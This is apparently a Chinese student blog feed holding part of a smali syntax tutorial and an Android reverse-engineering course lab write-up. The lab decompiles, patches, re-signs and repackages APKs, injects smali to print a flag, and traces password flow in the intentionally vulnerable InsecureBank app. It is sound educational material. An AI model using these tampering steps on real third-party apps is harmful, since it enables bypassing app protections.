class="hljs-built_in"></span><br><span class="hljs-built_in">invoke-static </span>&#123;v2, v0&#125;, <span class="hljs-class">Landroid/util/Log;</span>-&gt;e(<span class="hljs-class">Ljava/lang/String;</span><span class="hljs-class">Ljava/lang/String;</span>)I<span class="hljs-built_in"></span><br><span class="hljs-built_in">return-void </span><span class="hljs-keyword"></span><br><span class="hljs-keyword">.end method</span><br></code></pre></td></tr></table></figure>

<h4 id="switch-语句"><a href="#switch-语句" class="headerlink" title="switch 语句"></a>switch 语句</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">public void encrypt(int flag) &#123;<br>        String ans = null;<br>        switch (flag)&#123;<br>            case 0:<br>                ans = <span class="hljs-string">&quot;ans is 0&quot;</span>;<br>                break;<br>            default:<br>                ans = <span class="hljs-string">&quot;noans&quot;</span>;<br>                break;<br>        &#125;<br>        Log.v(<span class="hljs-string">&quot;ans:&quot;</span>,ans);<br>    &#125;<br>&lt;=对应smali=&gt;<br><span class="hljs-comment">#public void encrypt(int flag) &#123;</span><br><span class="hljs-keyword">.method</span><span class="hljs-keyword"> public</span> encrypt(I)V <br><span class="hljs-keyword">    .locals</span> 2<br><span class="hljs-keyword">    .param</span> p1, <span class="hljs-string">&quot;flag&quot;</span>    <span class="hljs-comment"># I</span><br><span class="hljs-keyword">    .prologue</span><br>    <br><span class="hljs-comment">#String ans = null;</span><br>   <span class="hljs-built_in"> const/4 </span>v0, 0x0<br><span class="hljs-keyword">    .local</span> v0, <span class="hljs-string">&quot;ans&quot;</span>:<span class="hljs-class">Ljava/lang/String;</span><br>    <br><span class="hljs-comment">#switch (flag)&#123;</span><br>   <span class="hljs-built_in"> packed-switch </span>p1,<span class="hljs-keyword"> :pswitch_data_0</span>	 <span class="hljs-comment"># pswitch_data_0指定case区域的开头及结尾</span><br>    <br><span class="hljs-comment">#default: ans=&quot;noans&quot;</span><br>   <span class="hljs-built_in"> const-string </span>v0, <span class="hljs-string">&quot;noans&quot;</span><br>    <br><span class="hljs-comment">#Log.v(&quot;ans:&quot;,ans)</span><br>   <span class="hljs-keyword"> :goto_0</span><br>   <span class="hljs-built_in"> const-string </span>v1, <span class="hljs-string">&quot;ans:&quot;</span><br>   <span class="hljs-built_in"> invoke-static </span>&#123;v1, v0&#125;, <span class="hljs-class">Landroid/util/Log;</span>-&gt;v(<span class="hljs-class">Ljava/lang/String;</span><span class="hljs-class">Ljava/lang/String;</span>)I<br>   <span class="hljs-built_in"> return-void</span><br><span class="hljs-built_in"></span>    <br><span class="hljs-comment">#case 0: ans=&quot;ans is 0&quot;</span><br>   <span class="hljs-keyword"> :pswitch_0</span>      <span class="hljs-comment">#pswitch_&lt;case的值&gt;</span><br>   <span class="hljs-built_in"> const-string </span>v0, <span class="hljs-string">&quot;ans is 0&quot;</span><br>   <span class="hljs-built_in"> goto </span>:goto_0  <span class="hljs-comment"># break</span><br>   <span class="hljs-built_in"> nop</span><br><span class="hljs-built_in"></span>   <span class="hljs-keyword"> :pswitch_data_0</span> <span class="hljs-comment">#case区域的结束</span><br><span class="hljs-keyword">    .packed</span>-switch 0x0   <span class="hljs-comment">#定义case的情况</span><br>       <span class="hljs-keyword"> :pswitch_0</span>   <span class="hljs-comment">#case 0</span><span class="hljs-keyword"></span><br><span class="hljs-keyword">    .end packed</span>-switch<span class="hljs-keyword"></span><br><span class="hljs-keyword">.end method</span><br></code></pre></td></tr></table></figure>

<p>其中case定义情况有两种：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">从0开始递增<span class="hljs-built_in"></span><br><span class="hljs-built_in">packed-switch </span>p1,<span class="hljs-keyword"> :pswitch_data_0</span><br><span class="hljs-keyword">.</span>..<span class="hljs-keyword"></span><br><span class="hljs-keyword">:pswitch_data_0</span><br><span class="hljs-keyword">.packed</span>-switch 0x0<br>   <span class="hljs-keyword"> :pswitch_0</span><br>   <span class="hljs-keyword"> :pswitch_1</span> <br></code></pre></td></tr></table></figure>

<p>或者：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">无规则switch<span class="hljs-built_in"></span><br><span class="hljs-built_in">sparse-switch </span>p1,:sswitch_data_0<br><span class="hljs-keyword">.</span>..<br>sswitch_data_0<br><span class="hljs-keyword">.sparse</span>-switch<br>    0xa -&gt;<span class="hljs-keyword"> :</span> sswitch_0<br>    0xb -&gt;<span class="hljs-keyword"> :</span> sswitch_1 <span class="hljs-comment"># 字符会转化成数组</span><br></code></pre></td></tr></table></figure>

<h4 id="try-catch-语句"><a href="#try-catch-语句" class="headerlink" title="try-catch 语句"></a>try-catch 语句</h4><figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">public void encrypt(int flag) &#123;<br>    String ans = null;<br>    try &#123;<br>        ans = <span class="hljs-string">&quot;ok!&quot;</span>;<br>    &#125; catch (Exception e)&#123;<br>        ans = e.toString();<br>    &#125;<br>    Log.d(<span class="hljs-string">&quot;error&quot;</span>,ans);<br>&#125;<br>&lt;=对应smali=&gt;<br><span class="hljs-comment">#public void encrypt(int flag) &#123;</span><br><span class="hljs-keyword">.method</span><span class="hljs-keyword"> public</span> encrypt(I)V<br><span class="hljs-keyword">    .locals</span> 3<br><span class="hljs-keyword">    .param</span> p1, <span class="hljs-string">&quot;flag&quot;</span>    <span class="hljs-comment"># I</span><br><span class="hljs-keyword">    .prologue</span><br>    <br><span class="hljs-comment">#String ans = null;</span><br>   <span class="hljs-built_in"> const/4 </span>v0, 0x0<br><span class="hljs-keyword">    .line</span> 20<br><span class="hljs-keyword">    .local</span> v0, <span class="hljs-string">&quot;ans&quot;</span>:<span class="hljs-class">Ljava/lang/String;</span><br>    <br><span class="hljs-comment">#try &#123; ans=&quot;ok!&quot;; &#125;</span><br>   <span class="hljs-keyword"> :try_start_0</span>  <span class="hljs-comment"># 第一个try开始，</span><br>   <span class="hljs-built_in"> const-string </span>v0, <span class="hljs-string">&quot;ok!&quot;</span><br>   <span class="hljs-keyword"> :try_end_0</span>   <span class="hljs-comment"># 第一个try结束(主要是可能有多个try)</span><br><span class="hljs-keyword">    .catch</span> <span class="hljs-class">Ljava/lang/Exception;</span> &#123;:try_start_0 ..<span class="hljs-keyword"> :try_end_0</span>&#125;<span class="hljs-keyword"> :catch_0</span><br>    <br><span class="hljs-comment">#Log.d(&quot;error&quot;,ans);</span><br>   <span class="hljs-keyword"> :goto_0</span><br>   <span class="hljs-built_in"> const-string </span>v2, <span class="hljs-string">&quot;error&quot;</span><br>   <span class="hljs-built_in"> invoke-static </span>&#123;v2, v0&#125;, <span class="hljs-class">Landroid/util/Log;</span>-&gt;d(<span class="hljs-class">Ljava/lang/String;</span><span class="hljs-class">Ljava/lang/String;</span>)I<br>   <span class="hljs-built_in"> return-void</span><br><span class="hljs-built_in"></span>    <br><span class="hljs-comment">#catch (Exception e)&#123;ans = e.toString();&#125;</span><br>   <span class="hljs-keyword"> :catch_0</span> <span class="hljs-comment">#第一个catch</span><br>   <span class="hljs-built_in"> move-exception </span>v1<br><span class="hljs-keyword">    .local</span> v1, <span class="hljs-string">&quot;e&quot;</span>:<span class="hljs-class">Ljava/lang/Exception;</span><br>   <span class="hljs-built_in"> invoke-virtual </span>&#123;v1&#125;, <span class="hljs-class">Ljava/lang/Exception;</span>-&gt;toString()<span class="hljs-class">Ljava/lang/String;</span><br>   <span class="hljs-built_in"> move-result-object </span>v0<br>   <span class="hljs-built_in"> goto </span>:goto_0<span class="hljs-keyword"></span><br><span class="hljs-keyword">.end method</span><br></code></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Lab</title>
    <url>/2023/03/08/2023-03-08-Lab/</url>
    <content><![CDATA[<h2 id="Lab1"><a href="#Lab1" class="headerlink" title="Lab1"></a>Lab1</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
<li>下载完 Android Studio 后建议参考这篇文章的前半部分换源，不然的话构建速度有些慢，一开始一直以为是bug。。。并且这篇文章很好地介绍了整个开发的架构，以及其文件的大致作用，十分友好<a href="https://blog.csdn.net/qq_39400113/article/details/116210189">手把手教你写一个安卓app_怎么写app_果果小师弟的博客-CSDN博客</a></li>
<li>参考<a href="https://www.runoob.com/android/android-services.html">菜鸟教程</a>里面有介绍组件的回调函数的作用。</li>
<li>Handler 参考 <a href="https://www.jianshu.com/p/f65d79e4e45d">https://www.jianshu.com/p/f65d79e4e45d</a></li>
</ul>
<p>tips：开 VPN 运行远程的 AVD 会很流畅。</p>
<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><h4 id="Task-1"><a href="#Task-1" class="headerlink" title="Task 1"></a>Task 1</h4><p>AndroidManifest 文件中进行配置的广播接收者会随系统的启动而一直处于活跃状态，只要接收到感兴趣的广播就会触发（即使程序未运行）所以我们需要把广播写入到 AndroidManifest 里。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230310141941697.png"><span class="image-caption">image-20230310141941697</span></p>
<p>Android 8.0 以上使用 startForegroundService() 方法，以下则使用 startService() 方法来启动服务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.smali.secretchallenge;<br><span class="hljs-keyword">import</span> android.content.BroadcastReceiver;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecretBootReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BroadcastReceiver</span> </span>&#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) &#123;<br>            Intent serviceIntent = <span class="hljs-keyword">new</span> Intent(context, SecretService.class);<br>            context.startService(serviceIntent);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在获取位置时，需要添加权限声明：</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230310142205220.png"><span class="image-caption">image-20230310142205220</span></p>
<p>使用 LocationManager 和 LocationListener 获取 GPS，然后通过 Handler 进行循环执行读取 GPS 信息，并且弹窗：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">onStartCommand</span><span class="hljs-params">(Intent intent, <span class="hljs-keyword">int</span> flags, <span class="hljs-keyword">int</span> startId)</span> </span>&#123;<br>    locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);<br>    <span class="hljs-keyword">if</span> (ActivityCompat.checkSelfPermission(<span class="hljs-keyword">this</span>, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED<br>            &amp;&amp; ActivityCompat.checkSelfPermission(<span class="hljs-keyword">this</span>, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) &#123;<br>        <span class="hljs-keyword">return</span> flags;<br>    &#125;<br>    locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">this</span>);<br>    handler = <span class="hljs-keyword">new</span> Handler(Looper.getMainLooper());<br>    runnable = <span class="hljs-keyword">new</span> Runnable() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>            Location lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);<br>            <span class="hljs-keyword">if</span> (lastLocation != <span class="hljs-keyword">null</span>) &#123;<br>                String message = String.format(<span class="hljs-string">&quot;getAccuracy:%s\ngetLatitude: %s\ngetLongitude: %s&quot;</span>, lastLocation.getAccuracy(), lastLocation.getLatitude(), lastLocation.getLongitude());<br>                Toast.makeText(getApplicationContext(), message, Toast.LENGTH_SHORT).show();<br>            &#125;<br>            handler.postDelayed(runnable, <span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;;<br>    handler.post(runnable);<br>    <span class="hljs-keyword">return</span> flags;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在 Android 4.0 之后需要启动应用，否则开机的时候会收不到开机广播，所以还要手动在终端输入 <code>adb shell am broadcast -a android.intent.action.BOOT_COMPLETED </code>广播消息。</p>
<p>最终实现效果图：</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230310141851781.png"><span class="image-caption">image-20230310141851781</span></p>
<h4 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h4><p>先制作样式，可以直接可视化制作，十分方便。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230310204608575.png"><span class="image-caption">image-20230310204608575</span></p>
<p>在触发 click 动作时，产生一个线程去执行弹窗。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">button.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>&#123;<br>        String value = editText.getText().toString();<br><br>        <span class="hljs-keyword">new</span> Thread(<span class="hljs-keyword">new</span> Runnable() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>                runOnUiThread(<span class="hljs-keyword">new</span> Runnable() &#123;<br>                    <span class="hljs-meta">@Override</span><br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>                        showDialog(value);<br>                    &#125;<br>                &#125;);<br>            &#125;<br>        &#125;).start();<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>效果展示：</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230310204429962.png"><span class="image-caption">image-20230310204429962</span></p>
<h4 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h4><p>了解一下 Java 反射的知识，使用 Method 和 Filed 进行操作需要访问的类的方法和成员变量即可完成任务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">Class&lt;?&gt; poRELabClass = Class.forName(<span class="hljs-string">&quot;com.pore.mylibrary.PoRELab&quot;</span>);<br>         Field curStrField = poRELabClass.getDeclaredField(<span class="hljs-string">&quot;curStr&quot;</span>);<br>         Method privateMethod = poRELabClass.getDeclaredMethod(<span class="hljs-string">&quot;privateMethod&quot;</span>, String.class, String.class);<br>         curStrField.setAccessible(<span class="hljs-keyword">true</span>);<br>         privateMethod.setAccessible(<span class="hljs-keyword">true</span>);<br>         PoRELab poreLab = <span class="hljs-keyword">new</span> PoRELab();<br>         String curStrValue = (String) curStrField.get(poreLab);<br>         privateMethod.invoke(poreLab, <span class="hljs-string">&quot;hello&quot;</span>, curStrValue);<br></code></pre></td></tr></table></figure>

<p>成果展示：</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230311115622746.png"><span class="image-caption">image-20230311115622746</span></p>
<h4 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h4><p>使用 Android Studio 进行签名，一路往下填写即可。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230311142435805.png"><span class="image-caption">image-20230311142435805</span></p>
<h3 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h3><h4 id="smali2java"><a href="#smali2java" class="headerlink" title="smali2java"></a>smali2java</h4><p>学习完 smali 的语法就可以开始进行手工恢复成 Java 代码了，我想法是在 IDEA 里面写java代码，跟着 smali 的顺序写，比如刚开始的时候，</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230311213504770.png"><span class="image-caption">image-20230311213504770</span></p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230311213609412.png"><span class="image-caption">image-20230311213609412</span></p>
<p>下列的意思是，先将 p0 的值给予 v0，而 p0 是 this.checker（根据标注），所以 v0 现在是 this.checker，然后是 v0 调用 check 方法，并且传入一个参数，因此变为 this.checker.check(str)  再将返回值存入 v0，返回 v0，也就是说返回调用this.checker.check(str) 的返回值，因此可以简化为 return this.checker.check(str)。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230311220911056.png"><span class="image-caption">image-20230311220911056</span></p>
<p>搞明白这个，再看上面的那部分代码（前面没看懂），这是个构造函数，负责 CheckBox 的初始化，因此下列代码很清晰的可以变成下面的java代码，所以很显然上面写错了，那边只是声明，并未实例化。</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><code class="hljs haxe"><span class="hljs-built_in">this</span>.encoder = <span class="hljs-keyword">new</span> <span class="hljs-type">Encoder</span>();<br><span class="hljs-built_in">this</span>.checker = <span class="hljs-keyword">new</span> <span class="hljs-type">Checker</span>();<br></code></pre></td></tr></table></figure>

<p><img src="/2023/03/08/2023-03-08-Lab/image-20230311223459762.png"><span class="image-caption">image-20230311223459762</span></p>
<p><code>array-length v3, p0</code>指的是将 cmd 窗口编译 java 文件传入的参数个数传递个 v3。同时这边的判断根据jadx的转换可以学习到，不能直接顺着意思去转换，应该先考虑不满足条件的情况，即先写等于的情况，这样接下来的就都是属于其执行的内容。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230311231221514.png"><span class="image-caption">image-20230311231221514</span></p>
<p>后续就没什么了，还是相对容易的，最终 CheckBox.java 代码如下：</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230312135200456.png"><span class="image-caption">image-20230312135200456</span></p>
<p>像这种的构造函数初始化只是去给前面的域赋值，其实是可以省略的，直接对前面的域赋初值就行，如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> String secret = <span class="hljs-string">&quot;key&quot;</span>;<br></code></pre></td></tr></table></figure>

<p><img src="/2023/03/08/2023-03-08-Lab/image-20230312135828201.png"><span class="image-caption">image-20230312135828201</span></p>
<p>遇到count方法时，是转换成了这样的代码，但是看起来其实是不对劲的，有些地方不合逻辑，因为这个方法的逻辑应该是统计字符中’1’的个数，然后返回该个数，所以需要我们再给代码优化一下。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230312145949836.png"><span class="image-caption">image-20230312145949836</span></p>
<p>优化成这样，就舒服了不少：</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230312150323229.png"><span class="image-caption">image-20230312150323229</span></p>
<p>这边 jadx 转换的很好，两次的判断结果可以直接与返回值联系起来，因此直接就写成如下代码就行：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> count == func(count) &amp;&amp; <span class="hljs-keyword">this</span>.checkStr1(str.substring(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>));<br></code></pre></td></tr></table></figure>

<p><img src="/2023/03/08/2023-03-08-Lab/image-20230312151948196.png"><span class="image-caption">image-20230312151948196</span></p>
<p>然后最后再转换 checkStr1 这方法（因为他看起来挺复杂的），先扫一眼 jadx 转换结果是一个 for 循环，所以我的思路就跟之前的有些不一致：是先审视过所有的 smali，然后再写一个大致的 java 代码，然后再一一对应的填充。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230312153700980.png"><span class="image-caption">image-20230312153700980</span></p>
<p>对应上方的框架，我写的代码如下，但是已经很能表现出来了，显然 v0 是循环次数，count 是 ‘x’ 的个数，当 ‘x’ 有一个和两个时会将此时的循环次数 v0 赋值出去。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230312153727348.png"><span class="image-caption">image-20230312153727348</span></p>
<p>优化一下代码为：</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230312154352387.png"><span class="image-caption">image-20230312154523112</span></p>
<p>接下的就是跟之前的 return 思想一致，就不展示了。</p>
<p>接下来就是最后一个 smali 文件了，发现貌似没啥好说的，直接展现最终的结果吧</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230313161648612.png"><span class="image-caption">image-20230313161648612</span></p>
<h4 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h4><p>转换后代码就很容易了，需要满足以下条件：</p>
<ul>
<li>输入字符串的长度在 12~16</li>
<li>从第 10 开始的字符只能含有一个 ‘1’</li>
<li>0~9 的字符串中要含有两个 ‘x’</li>
<li>两个 ‘x’ 的索引值相差 4 </li>
<li>第 0 个字符是 ‘0’</li>
<li>第 9 个字符是 ‘9’</li>
<li>在第 0 和 第一个 ‘x’ 出现的地方要含有 ‘key’</li>
</ul>
<p>综上可以输入 <code>0keyx567x9100</code></p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230312215502615.png"><span class="image-caption">image-20230312215502615</span></p>
<p>下面是 转换出的 java 的执行结果。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230313152959852.png"><span class="image-caption">image-20230313152959852</span></p>
<h4 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h4><p><img src="/2023/03/08/2023-03-08-Lab/image-20230313155257746.png"><span class="image-caption">image-20230313155257746</span></p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230313155244679.png"><span class="image-caption">image-20230313155244679</span></p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230313161330955.png"><span class="image-caption">image-20230313161330955</span></p>
<p>我们可以在配置里面添加运行的参数。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230313161344219.png"><span class="image-caption">image-20230313161344219</span></p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230313161304295.png"><span class="image-caption">image-20230313161304295</span></p>
<h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><h4 id="Unpack-Apk"><a href="#Unpack-Apk" class="headerlink" title="Unpack Apk"></a>Unpack Apk</h4><p>把 apktool 和 需要解包的 apk 放在同一目录下，打开 cmd 运行下列命令即可解包 apk。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar apktool_<span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.jar d Step<span class="hljs-number">3</span>_Task<span class="hljs-number">123</span>_lab.apk<br></code></pre></td></tr></table></figure>

<p><img src="/2023/03/08/2023-03-08-Lab/image-20230315202038753.png"><span class="image-caption">image-20230315202038753</span></p>
<p>因遇到报错，更正为（因为刚开始以为是版本问题，所以下了个 2.6.1 的）：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar apktool_<span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">1</span>.jar -r d Step<span class="hljs-number">3</span>_Task<span class="hljs-number">123</span>_lab.apk<br></code></pre></td></tr></table></figure>

<h4 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h4><p>使用 jeb 或者 jadx 直接打开 apk 即可看到反汇编后的 smali 语法，也可以直接看到由 smali 翻译出来的 java 伪代码。</p>
<h4 id="Repack-Apk"><a href="#Repack-Apk" class="headerlink" title="Repack Apk"></a>Repack Apk</h4><p>把 999999 修改为 1。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230315215510774.png"><span class="image-caption">image-20230315215510774</span></p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230315215549175.png"><span class="image-caption">image-20230315215549175</span></p>
<p>重打包为 apk。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230316195127711.png"><span class="image-caption">image-20230316195127711</span></p>
<h4 id="Sign-Apk"><a href="#Sign-Apk" class="headerlink" title="Sign Apk"></a>Sign Apk</h4><p>git bash 打开，先生成私钥文件：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> genrsa -<span class="hljs-number">3</span> -out testkey.pem <span class="hljs-number">2048</span><br></code></pre></td></tr></table></figure>

<p>再生成 CA 自签证书，有限期为 10000 天</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> req -new -x<span class="hljs-number">509</span> -key testkey.pem -out testkey.x<span class="hljs-number">509</span>.pem -days <span class="hljs-number">10000</span><br></code></pre></td></tr></table></figure>

<p><img src="/2023/03/08/2023-03-08-Lab/image-20230316195756115.png"><span class="image-caption">image-20230316195756115</span></p>
<p>使用 pkcs8 标准保存私钥文件信息（未加密版）。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">openssl pkcs8 -<span class="hljs-keyword">in</span> testkey.pem -topk8 -outform DER -out testkey.pk8 -nocrypt<br></code></pre></td></tr></table></figure>

<p>用 apksigner.jar 对 apk 进行签名。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><code class="hljs sh">java -jar apksigner.jar sign --cert testkey.x509.pem --key testkey.pk8 --<span class="hljs-keyword">in</span> Step3_Task123_lab.apk -out lab_signed.apk<br></code></pre></td></tr></table></figure>

<p><img src="/2023/03/08/2023-03-08-Lab/image-20230316200548791.png"><span class="image-caption">image-20230316200548791</span></p>
<p>安装 apk 后，可以发现次数已经被修改为 1了，</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230316210037098.png"><span class="image-caption">image-20230316210037098</span></p>
<p>因此可以很轻易的完成 task1。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230316210102989.png"><span class="image-caption">image-20230316210102989</span></p>
<h3 id="Tasks"><a href="#Tasks" class="headerlink" title="Tasks"></a>Tasks</h3><h4 id="Task-1-Knock-the-door"><a href="#Task-1-Knock-the-door" class="headerlink" title="Task 1 Knock the door"></a>Task 1 Knock the door</h4><p>任务一已经在上面完成。然后这边我有点疑惑的点就是说，怎么触发的点击事件，不是要实现一个 setOnClickListener 的监听器吗？经过一番学习，还有一种实现方法，就是在 activity_main.xml 中，对 button 直接指定其会触发的方法。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317153406710.png"><span class="image-caption">image-20230317153406710</span></p>
<h4 id="Task-2-Give-me-your-token"><a href="#Task-2-Give-me-your-token" class="headerlink" title="Task 2 Give me your token"></a>Task 2 Give me your token</h4><p>任务二也很简单的，把生成的数据自己跑一遍代码即可。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317155200488.png"><span class="image-caption">image-20230317155200488</span></p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317155134457.png"><span class="image-caption">image-20230317155134457</span></p>
<h4 id="Task-3-Call-to-the-NPC"><a href="#Task-3-Call-to-the-NPC" class="headerlink" title="Task 3 Call to the NPC"></a>Task 3 Call to the NPC</h4><p>只需要在最终返回时添加下列的 smali 代码调用 skdaga ，然后输出其结果。</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><code class="hljs smali">invoke-static &#123;p1&#125;, <span class="hljs-class">Lcom/pore/play4fun/PlayGame;</span>-&gt;skdaga(<span class="hljs-class">Ljava/lang/String;</span>)<span class="hljs-class">Ljava/lang/String;</span><br><span class="hljs-built_in"></span><br><span class="hljs-built_in">move-result-object </span>v0<br></code></pre></td></tr></table></figure>

<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317203250525.png"><span class="image-caption">image-20230317203250525</span></p>
<p>调用运行后会打印出 flag</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317203218916.png"><span class="image-caption">image-20230317203218916</span></p>
<h4 id="Task-4-Where-password-flows-to"><a href="#Task-4-Where-password-flows-to" class="headerlink" title="Task 4 Where password flows to"></a>Task 4 Where password flows to</h4><p>先确认 com.android.insecurebank.InsecureBankActivity 是最开始执行的 activity。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317185825970.png"><span class="image-caption">image-20230317185825970</span></p>
<p>InsecureBankActivity 只实现了一个跳转去 LoginScreen 的功能，所以接下来去看 LoginScreen 的代码。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317190555333.png"><span class="image-caption">image-20230317190555333</span></p>
<p>确认 password_text 就是我们要追踪的变量。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317190749346.png"><span class="image-caption">image-20230317190749346</span></p>
<p>LoginScreen 实现了三个按钮的功能，一个是记住账号，一个是可以设置登录地址的 ip 和 port，第三个是我们需要关注的 login 功能如下图，后续会执行 restClient 的 doLogin 方法，或者 Statusode 为 -1 时执行 PostLogin，我们先追踪 restClient 的 doLogin。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317192444458.png"><span class="image-caption">image-20230317192444458</span></p>
<p>doLogin 实现了一个 URL 的拼接，然后转而执行 postHttpContent。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317193036009.png"><span class="image-caption">image-20230317193036009</span></p>
<p>最终在 postHttpContent 把账号密码通过 post 的方式传入之前设置好的 ip:port</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230317200453615.png"><span class="image-caption">image-20230317200453615</span></p>
<p>这边已经到头了，转回去分析之前的另一条分支： Statusode 为 -1 时执行的 PostLogin，会有两个新的按钮，一个是 rawhistory，这个跟 password 无关，我们关注另一个 transfer_button，会先执行如下代码。</p>
<p><img src="/2023/03/08/2023-03-08-Lab/image-20230318151331373.png"><span class="image-caption">image-20230318151331373</span></p>
